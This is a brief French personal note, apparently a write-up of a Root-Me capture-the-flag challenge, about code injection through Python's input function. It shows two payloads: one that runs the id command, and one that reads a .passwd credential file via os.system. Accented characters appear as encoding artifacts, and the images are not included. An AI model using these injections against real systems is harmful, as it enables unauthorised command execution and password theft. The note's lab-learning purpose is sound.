---
categorie: app-script
---

#informatique/cyber 
#rootme


![[Pasted image 20230807213728.png]]

![[Pasted image 20230807213743.png]]
La faille ici, câ€™est lâ€™utilisation de la fonction Â«Â inputÂ Â», pour voir la faille, il suffit de faire un appel du genre :
```bash
__import__('os').system('id')

```
pour rÃ©cupÃ©rer le mot de passe il suffit de faireÂ :
```bash
__import__('os').system('cat .passwd')
```

![[Pasted image 20230807214149.png]]